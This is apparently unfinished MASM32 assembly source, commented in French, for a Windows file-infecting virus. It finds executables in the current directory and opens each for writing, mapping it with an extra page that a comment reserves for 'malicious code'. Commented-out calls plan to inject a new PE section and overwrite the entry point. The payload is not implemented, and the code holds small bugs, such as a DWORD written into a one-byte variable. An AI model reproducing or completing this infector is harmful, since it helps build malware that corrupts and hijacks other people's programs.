    
.386					; Enable 80386+ instruction set
.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
option casemap: none	; Case sensitive syntax

; *************************************************************************
; MASM32 proto types for Win32 functions and structures
; *************************************************************************  
include c:\masm32\include\windows.inc
include c:\masm32\include\user32.inc
include c:\masm32\include\kernel32.inc
include C:\masm32\include\masm32.inc
include C:\masm32\include\masm32rt.inc

; *************************************************************************
; MASM32 object libraries
; *************************************************************************  
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\kernel32.lib
includelib C:\masm32\lib\masm32.lib

.data
	strTitle		db "Bare Bone",0
 	strMessage	db "Hello World!",0
 	
	pathTargetL		db		"Path target",0
	listTargetL		db		"Targets list",0
	
	;
	; Addresse de l'exe mappé
	;
	mappedAddr		db		0

;
; Struct url
;


; *************************************************************************
; Our executable assembly code starts here in the .code section
; *************************************************************************
.code

CheckExe proc Path:PTR BYTE
	local FileInfo:SHFILEINFO
	
	; SI SHGFI_EXETYPE => eax type d'exe 
	invoke SHGetFileInfo, Path, FILE_ATTRIBUTE_NORMAL, ADDR FileInfo, SIZEOF FileInfo, SHGFI_EXETYPE
	; Si eax = 0. Le fichier n'est pas un exe
	; Sinon dans eax, le type d'exe
 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
	ret
CheckExe endp

MapExe proc path:DWORD
	local buff:OFSTRUCT
	
	local hfile:HANDLE
	local nSize:DWORD
	local fileSizeHigh:DWORD
	
	local hfileMap:HANDLE
	
	; Ouvre l'exe
	invoke OpenFile, path, ADDR buff, 2h
 	mov hfile, eax
	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
	
	invoke GetFileSize, hfile, ADDR fileSizeHigh
	mov nSize, eax
	
	; Ajoute plus d'espace (une page) pour le code malicieux
	add nSize, 1000h
	
	invoke CreateFileMapping, hfile, 0, PAGE_READWRITE, 0, nSize, 0
	mov hfileMap, eax
	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
	
	invoke MapViewOfFile, hfileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0h
	
	mov DWORD PTR mappedAddr, eax
	invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK

	;
	;
	;  L'executable est mappé en memoire.
	;
	;
	
	; set entryPoint
	; set nbSections
	;invoke GetInfoPE
	
	;
	; Ajout d'une section dans l'executable.
	;
	;	- Rajouter une IMAGE_SECTION_HEADER à la fin du header de sections
	;				
	;       - Name[IMAGE_SIZEOF_SHORT_NAME] => Nom de la section
	;		- DWORD |PhysicalAdresse + VirutSize
	;		- DWORD VirtualAddress => Address premier byte de la section
	;		-
	;invoke GetLastSection
	;invoke InjectSection, eax
	
	 
	;invoke OverwriteEntryPoint, 00414243h
	;invoke DisplayEntryPoint
	;invoke SectionTable
	ret
MapExe endp

ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
	local fileTarget[512]:byte

	invoke StrLen, Directory
	invoke MemCopy, Directory, ADDR fileTarget, eax
	
	invoke StrLen, Directory
	lea edi, fileTarget
	add edi, eax
	invoke StrLen, File
	mov edx, edi
	add edx, eax
	mov BYTE PTR [edx], 0
	invoke MemCopy, File, edi, eax
	
	invoke CheckExe, ADDR fileTarget
	test eax, eax
	jz ProcessFileEnd
	
	invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
 	invoke MapExe, ADDR fileTarget
 	;
 	; Mapping de l'exe
 	;
 	
ProcessFileEnd:
	ret
ProcessFile endp

;
;
;
align 4

Yharnam proc uses esi edi Directory:PTR BYTE
	local hfile:HANDLE
	local ffd:WIN32_FIND_DATA
	local directoryFilter[128]:byte
	
	; Rajoute "*" pour le filtre
	invoke StrLen, Directory
	lea edi, directoryFilter
	add edi, eax
	mov WORD PTR [edi], 002Ah
	
	invoke MemCopy, Directory, ADDR directoryFilter, eax
	
	;Sinvoke MessageBox, 0, ADDR directoryFilter, ADDR listTargetL, MB_OK
	
	invoke FindFirstFile, ADDR directoryFilter, ADDR ffd
	mov hfile, eax

	;invoke MessageBox, 0, uhex$(eax), ADDR listTargetL, MB_OK
BDIR:
	test eax, eax
 	jz BDIREND
 	;mov eax, 0
 	
 	; Mes dans ebx l'addresse de ffd
	lea esi, ffd
	; Mes dans edx l'addresse de cFileName
	lea esi, [esi].WIN32_FIND_DATA.cFileName

	; Affiche le nom du fichiers présent (ADDR du buffer dans edx)
	;invoke MessageBox, 0, esi, ADDR listTargetL, MB_OK
	;invoke MessageBox, 0, Directory, ADDR listTargetL, MB_OK
	
	invoke ProcessFile, Directory, esi
	; Le retour de FindNextFile est save dans eax
	invoke FindNextFile, hfile, ADDR ffd
	jmp BDIR
BDIREND:
	ret
Yharnam endp


; ---------------------------------------------------------
;
; ---------------------------------------------------------

align 4

WinMain proc
	; Destination pour le path
	local buff[128]:byte

	; WIN API
	invoke GetCurrentDirectory, 124, ADDR buff
	
 	invoke StrLen, ADDR buff
	lea edi, buff
	add edi, eax
	mov WORD PTR [edi], 005Ch
	; Affiche le buffer et la taille avant rajout de "\*"
	invoke MessageBox, 0, ADDR buff, ADDR pathTargetL, MB_OK	
	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
	
	invoke Yharnam, ADDR buff
	ret
WinMain endp

start:
	invoke WinMain
    ;invoke ExitProcess, 0
end start
